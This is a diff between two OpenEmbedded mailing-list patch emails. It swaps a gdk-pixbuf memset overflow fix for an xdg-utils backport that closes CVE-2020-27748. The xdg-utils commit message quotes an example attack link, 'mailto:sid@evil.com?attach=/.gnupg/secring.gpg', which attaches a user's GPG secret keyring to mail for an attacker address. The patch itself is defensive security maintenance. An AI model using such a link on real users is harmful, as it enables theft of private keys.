@@ -1,137 +1,146 @@
-Received: from mail-oi1-f173.google.com (mail-oi1-f173.google.com [209.85.167.173])
- by mx.groups.io with SMTP id smtpd.web09.242.1631025879976858587
+Received: from mail-oi1-f180.google.com (mail-oi1-f180.google.com [209.85.167.180])
+ by mx.groups.io with SMTP id smtpd.web09.243.1631025885489014827
  for <openembedded-core@lists.openembedded.org>;
- Tue, 07 Sep 2021 07:44:40 -0700
+ Tue, 07 Sep 2021 07:44:45 -0700
 Authentication-Results: mx.groups.io;
- dkim=pass header.i=@sakoman-com.20150623.gappssmtp.com header.s=20150623 header.b=IcwD02ko;
- spf=softfail (domain: sakoman.com, ip: 209.85.167.173, mailfrom: steve@sakoman.com)
-Received: by mail-oi1-f173.google.com with SMTP id 6so13050349oiy.8
-        for <openembedded-core@lists.openembedded.org>; Tue, 07 Sep 2021 07:44:39 -0700 (PDT)
+ dkim=pass header.i=@sakoman-com.20150623.gappssmtp.com header.s=20150623 header.b=ObwNOT0Q;
+ spf=softfail (domain: sakoman.com, ip: 209.85.167.180, mailfrom: steve@sakoman.com)
+Received: by mail-oi1-f180.google.com with SMTP id s20so13091387oiw.3
+        for <openembedded-core@lists.openembedded.org>; Tue, 07 Sep 2021 07:44:45 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=sakoman-com.20150623.gappssmtp.com; s=20150623;
         h=from:to:subject:date:message-id:in-reply-to:references:mime-version
          :content-transfer-encoding;
-        bh=1ubqyPGFmUio8w7gzF7OHVaN38lRajdUZWoBg6M+Nbg=;
-        b=IcwD02ko0fPVz7ZSOekjSIY+cl7yX/3bV6VSpISMgtJ3Y0aOE6ovD+VIGR9dj3F8SK
-         DKkaxNpuOlVFMSxctVYAZEDfBUgbS6V9MvoBHuoq/Ct4YIHoZekhi+APsaTdfkv3PAFT
-         6+aabZf/iqUzFyRDWJlAcDITy517OI8WA/OCBjf9NwxG3xa/Lwpbvpx/n7V2oHJuXjiA
-         IUqDWTr9jHpBcZS02/+qTlWlJdAu2s0g9QKYHBd6E1N0uKKVrE45/kiF60hIedtDAYGD
-         e+hvj8f2zIBZHwLoEx3CBV4Mb1Y/cRv1LmS2byxpPFHfoZqRUb/Quj4LKHlzwnZ0GFHt
-         YYkw==
+        bh=C4mnULuY7IaCeCcGT2mT0Ac2uiTNPqlA2ubuRKF0Rhs=;
+        b=ObwNOT0QnG1ED/2xZvO6Xa0BNRYEQRLLIqhmk8W9WOv5kgJHmlcSZW40BHDytLEkYz
+         SilxA+AVRYBUQOqJdUzBKQ5kRvqjAyR3qk9yTFkmbK0Dfmm+D0d8G9isWuOKl4+hasO+
+         zXwyYePe2a1IEommgXIjIcjOrmz6TuXdI22uIYo0auLngY0JbTSR8RnQ9biaS/o3KbPt
+         RJfNv6X8AHuq2FRt2S5gVAneG8I8i2d2LR3G3go3dyj5rsU9U9gzR0G96SH4D5JedIkk
+         qjb13Erkm2QyGwPdLKYIJuhO8jGSC2qnICMj3sKSmmB1Dtwgck0M6b55kuy+GpkE4OgL
+         I6eQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
         h=x-gm-message-state:from:to:subject:date:message-id:in-reply-to
          :references:mime-version:content-transfer-encoding;
-        bh=1ubqyPGFmUio8w7gzF7OHVaN38lRajdUZWoBg6M+Nbg=;
-        b=G8xrPdi6N1mIuSVNtyN/eAQlVesPzNS02EoRdIywLvxdimTqfCycIH9rS82FdJV9Cf
-         exI2fs71SLOHqaKHV9eV1zLOibAyR9lyeypVJXgkJSgcnwBKrnxELjNO7EMfLpnpBMWD
-         lQ0mMp6oZ6vPGKieiNxH3DZh3iHY9yoLBRAEipSRtUtFrMuZe7z0Z82g9EDhdqrMLfiM
-         qmTkwHnlqLokomJaJiimLhMBVQIbUGfAL2LT6dLdPXVJjL6+x35fCtEIncQ6umc7HEsL
-         YyjISzcNsXsoO3LrHv0J2nH8Wh31fGEyImAyA3ZhXNOhvg/F7OH2Qt0ueBtC7MkJtRYM
-         OckQ==
-X-Gm-Message-State: AOAM533FFEqZ/drcrvz2pUdnbrrhb1cqetzF06h7iosUkanp/QiT+HbI
-	RyVMWGodLjOrGkMANbiwuax4PWAhZWwBKVcd
-X-Google-Smtp-Source: ABdhPJwX+2F4mSw2K49r3oDM7Zu3p1hegFHqKCBxnAy6MyhmTYEankdefHZxn1qEjMu2GqpI2N5i7w==
-X-Received: by 2002:a05:6808:189b:: with SMTP id bi27mr3165660oib.59.1631025878677;
-        Tue, 07 Sep 2021 07:44:38 -0700 (PDT)
+        bh=C4mnULuY7IaCeCcGT2mT0Ac2uiTNPqlA2ubuRKF0Rhs=;
+        b=deVMqaK88afV+QXIIIymxP5c1Td1vA04NWr5k7itqJCNDSqgGgJHqB0DyUKZLqe8Nk
+         GxFYBruFXQUlLcBoHn6ETnRtAH4ZXct+H/8lQQjQK48Nijft+1okcLgpskBR/BhhbtkL
+         TE7CKEKtGkJOVt9l7c/lLIZG5kxS2DXhoORr2oR/XqAZWn3jlt6OtCCimVrCdskvUgf9
+         Tns7qSSxpfclvLXnz6D0yeoA6T6dame2MgwZD0U6jVnE/DSOnpAzAzm1uKwq2qaZ6hOe
+         hUiDwL3zdRGdRlMiJ67lm/eCYI6Bp4nMOGwxgCcMDXuiMX76CoWWtlMY0H5i1RELFEtv
+         uWig==
+X-Gm-Message-State: AOAM5321b44APh2lpkxf66LLncqGaUyr8CL/3kDa+3Ipbrg2On1MYL+h
+	8wAxElwCXwfzvBU0j2AljXa8KbT/M2cRw5qX
+X-Google-Smtp-Source: ABdhPJzSd/iulpv8hcrccmjRMDNw/+9NEDzI+9CaMyPPnt/4pjDT+WV5FAxRW6zOpyhdcVMs24RMhw==
+X-Received: by 2002:aca:1914:: with SMTP id l20mr3166162oii.19.1631025884306;
+        Tue, 07 Sep 2021 07:44:44 -0700 (PDT)
 Return-Path: <steve@sakoman.com>
 Received: from localhost.localdomain ([172.243.4.16])
-        by smtp.gmail.com with ESMTPSA id q22sm1313761oof.14.2021.09.07.07.44.35
+        by smtp.gmail.com with ESMTPSA id q22sm1313761oof.14.2021.09.07.07.44.40
         for <openembedded-core@lists.openembedded.org>
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 07 Sep 2021 07:44:38 -0700 (PDT)
+        Tue, 07 Sep 2021 07:44:43 -0700 (PDT)
 From: "Steve Sakoman" <steve@sakoman.com>
 To: openembedded-core@lists.openembedded.org
-Subject: [OE-core][dunfell 1/5] gdk-pixbuf: fix CVE-2021-20240
-Date: Tue,  7 Sep 2021 04:44:04 -1000
-Message-Id: <c7b6a3fef6aa04bb1d264326e483e8a3d3350ca2.1631025627.git.steve@sakoman.com>
+Subject: [OE-core][dunfell 2/5] xdg-utils: Add fix for CVE-2020-27748
+Date: Tue,  7 Sep 2021 04:44:05 -1000
+Message-Id: <5042a4116a024bbc320d97ea29b21a589dea9942.1631025627.git.steve@sakoman.com>
 X-Mailer: git-send-email 2.25.1
 In-Reply-To: <cover.1631025627.git.steve@sakoman.com>
 References: <cover.1631025627.git.steve@sakoman.com>
 MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-From: Changqing Li <changqing.li@windriver.com>
+From: Richard Purdie <richard.purdie@linuxfoundation.org>
 
-Source: https://git.openembedded.org/openembedded-core
-MR: 111543
-Type: Security Fix
-Disposition: Backport from https://git.openembedded.org/openembedded-core/commit/meta/recipes-gnome/gdk-pixbuf?h=hardknott&id=bd08e4d179979937604c196b4047f59c5499a960
-ChangeID: bd08e4d179979937604c196b4047f59c5499a960
-Description:
+Backport an upstream patch for the CVE.
 
-(From OE-Core rev: bd08e4d179979937604c196b4047f59c5499a960)
-
-Signed-off-by: Changqing Li <changqing.li@windriver.com>
-Signed-off-by: Anuj Mittal <anuj.mittal@intel.com>
 Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
-(cherry picked from commit de631334ccd2d6af74ed795228394ee2b7218403)
-Signed-off-by: Armin Kuster <akuster@mvista.com>
+(cherry picked from commit 87191ed0303f6552865ad1edcacd674c57f2010c)
 Signed-off-by: Steve Sakoman <steve@sakoman.com>
 ---
- .../gdk-pixbuf/CVE-2021-20240.patch           | 40 +++++++++++++++++++
- .../gdk-pixbuf/gdk-pixbuf_2.40.0.bb           |  1 +
- 2 files changed, 41 insertions(+)
- create mode 100644 meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf/CVE-2021-20240.patch
+ ...9813e0eb0246f63b54e9e154970e609575af.patch | 58 +++++++++++++++++++
+ .../xdg-utils/xdg-utils_1.1.3.bb              |  1 +
+ 2 files changed, 59 insertions(+)
+ create mode 100644 meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
 
-diff --git a/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf/CVE-2021-20240.patch b/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf/CVE-2021-20240.patch
+diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
 new file mode 100644
-index 0000000000..fe594b24bb
+index 0000000000..948b9e22e9
 --- /dev/null
-+++ b/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf/CVE-2021-20240.patch
-@@ -0,0 +1,40 @@
-+From 086e8adf4cc352cd11572f96066b001b545f354e Mon Sep 17 00:00:00 2001
-+From: Emmanuele Bassi <ebassi@gnome.org>
-+Date: Wed, 1 Apr 2020 18:11:55 +0100
-+Subject: [PATCH] Check the memset length argument
++++ b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
+@@ -0,0 +1,58 @@
++From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
++From: =?UTF-8?q?J=C3=B6rg=20Thalheim?= <joerg@thalheim.io>
++Date: Tue, 18 Aug 2020 16:52:24 +0100
++Subject: [PATCH] xdg-email: remove attachment handling from mailto
++MIME-Version: 1.0
++Content-Type: text/plain; charset=UTF-8
++Content-Transfer-Encoding: 8bit
 +
-+Avoid overflows by using the checked multiplication macro for gsize.
++This allows attacker to extract secrets from users:
 +
-+Fixes: #132
++mailto:sid@evil.com?attach=/.gnupg/secring.gpg
 +
-+Upstream-Status: Backported [https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/commit/086e8adf4cc352cd11572f96066b001b545f354e]
-+CVE: CVE-2021-20240
++See also https://bugzilla.mozilla.org/show_bug.cgi?id=1613425
++and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
 +
-+Signed-off-by: Changqing Li <changqing.li@windriver.com>
++Signed-off-by: Jörg Thalheim <joerg@thalheim.io>
 +---
-+ gdk-pixbuf/io-gif-animation.c | 6 +++++-
-+ 1 file changed, 5 insertions(+), 1 deletion(-)
++ scripts/xdg-email.in | 7 +------
++ 1 file changed, 1 insertion(+), 6 deletions(-)
 +
-+diff --git a/gdk-pixbuf/io-gif-animation.c b/gdk-pixbuf/io-gif-animation.c
-+index c9db3c66e..49674fd2e 100644
-+--- a/gdk-pixbuf/io-gif-animation.c
-++++ b/gdk-pixbuf/io-gif-animation.c
-+@@ -412,11 +412,15 @@ gdk_pixbuf_gif_anim_iter_get_pixbuf (GdkPixbufAnimationIter *anim_iter)
++Upstream-Status: Backport
++CVE: CVE-2020-27748
++
++diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
++index 6db58ad..5d2f4f3 100644
++--- a/scripts/xdg-email.in
+++++ b/scripts/xdg-email.in
++@@ -32,7 +32,7 @@ _USAGE
 + 
-+         /* If no rendered frame, render the first frame */
-+         if (anim->last_frame == NULL) {
-++                gsize len = 0;
-+                 if (anim->last_frame_data == NULL)
-+                         anim->last_frame_data = gdk_pixbuf_new (GDK_COLORSPACE_RGB, TRUE, 8, anim->width, anim->height);
-+                 if (anim->last_frame_data == NULL)
-+                         return NULL;
-+-                memset (gdk_pixbuf_get_pixels (anim->last_frame_data), 0, gdk_pixbuf_get_rowstride (anim->last_frame_data) * anim->height);
-++                if (g_size_checked_mul (&len, gdk_pixbuf_get_rowstride (anim->last_frame_data), anim->height))
-++                        memset (gdk_pixbuf_get_pixels (anim->last_frame_data), 0, len);
-++                else
-++                        return NULL;
-+                 composite_frame (anim, g_list_nth_data (anim->frames, 0));
-+         }
++ run_thunderbird()
++ {
++-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
+++    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
++     THUNDERBIRD="$1"
++     MAILTO=$(echo "$2" | sed 's/^mailto://')
++     echo "$MAILTO" | grep -qs "^?"
++@@ -48,7 +48,6 @@ run_thunderbird()
++     BCC=$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=' | sed 's/^bcc=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
++     SUBJECT=$(echo "$MAILTO" | grep '^subject=' | tail -n 1)
++     BODY=$(echo "$MAILTO" | grep '^body=' | tail -n 1)
++-    ATTACH=$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=' | sed 's/^attach=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,$//'))
 + 
++     if [ -z "$TO" ] ; then
++         NEWMAILTO=
++@@ -68,10 +67,6 @@ run_thunderbird()
++         NEWMAILTO="${NEWMAILTO},$BODY"
++     fi
++ 
++-    if [ -n "$ATTACH" ] ; then
++-        NEWMAILTO="${NEWMAILTO},attachment='${ATTACH}'"
++-    fi
++-
++     NEWMAILTO=$(echo "$NEWMAILTO" | sed 's/^,//')
++     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
++     "$THUNDERBIRD" -compose "$NEWMAILTO"
 +-- 
 +GitLab
-diff --git a/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf_2.40.0.bb b/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf_2.40.0.bb
-index 54861e83c6..60a04c3581 100644
---- a/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf_2.40.0.bb
-+++ b/meta/recipes-gnome/gdk-pixbuf/gdk-pixbuf_2.40.0.bb
-@@ -25,6 +25,7 @@ SRC_URI = "${GNOME_MIRROR}/${BPN}/${MAJ_VER}/${BPN}-${PV}.tar.xz \
-            file://0006-Build-thumbnailer-and-tests-also-in-cross-builds.patch \
-            file://missing-test-data.patch \
-            file://CVE-2020-29385.patch \
-+           file://CVE-2021-20240.patch \
-            "
++
+diff --git a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+index d371c5c28c..41b74b8598 100644
+--- a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
++++ b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+@@ -20,6 +20,7 @@ LIC_FILES_CHKSUM = "file://LICENSE;md5=a5367a90934098d6b05af3b746405014"
+ SRC_URI = "https://portland.freedesktop.org/download/${BPN}-${PV}.tar.gz \
+            file://0001-Reinstate-xdg-terminal.patch \
+            file://0001-Don-t-build-the-in-script-manual.patch \
++           file://1f199813e0eb0246f63b54e9e154970e609575af.patch \
+           "
  
- SRC_URI_append_class-target = " \
+ SRC_URI[md5sum] = "902042508b626027a3709d105f0b63ff"
 -- 
 2.25.1
 
